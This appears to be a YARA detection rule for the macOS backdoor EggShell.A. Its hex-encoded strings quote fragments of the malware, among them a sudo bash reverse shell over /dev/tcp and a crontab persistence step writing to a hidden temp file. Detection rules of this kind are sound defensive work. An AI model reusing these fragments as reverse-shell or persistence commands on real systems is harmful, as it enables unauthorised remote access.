
rule Backdoor_MacOS_EggShell_A_xp{
	meta:
		description = "Backdoor:MacOS/EggShell.A!xp,SIGNATURE_TYPE_MACHOHSTR_EXT,05 00 05 00 05 00 00 "
		
	strings :
		$a_00_0 = {2f 64 65 76 2f 74 63 70 2f 25 40 2f 25 64 20 30 3e 26 31 20 32 3e 2f 64 65 76 2f 6e 75 6c 6c 27 20 3e 3e 20 2f 70 72 69 76 61 74 65 2f 74 6d 70 2f 2e 63 72 79 6f 6e } //1 /dev/tcp/%@/%d 0>&1 2>/dev/null' >> /private/tmp/.cryon
		$a_00_1 = {66 75 63 6b 20 25 64 } //1 fuck %d
		$a_01_2 = {73 75 64 6f 20 2d 53 20 62 61 73 68 20 26 3e 20 2f 64 65 76 2f 74 63 70 2f 25 40 2f 25 64 20 30 3e 26 31 20 32 3e 2f 64 65 76 2f 6e 75 6c 6c } //1 sudo -S bash &> /dev/tcp/%@/%d 0>&1 2>/dev/null
		$a_01_3 = {63 72 6f 6e 74 61 62 20 2d 6c 20 3e 20 2f 70 72 69 76 61 74 65 2f 74 6d 70 2f 2e 63 72 79 6f 6e } //1 crontab -l > /private/tmp/.cryon
		$a_00_4 = {45 67 67 53 68 65 6c 6c 2f 73 72 63 2f 65 73 70 6c 6f 73 78 2f 65 73 70 6c 6f 73 78 2f 65 73 70 6c 2e 68 } //1 EggShell/src/esplosx/esplosx/espl.h
	condition:
		((#a_00_0  & 1)*1+(#a_00_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_00_4  & 1)*1) >=5
 
}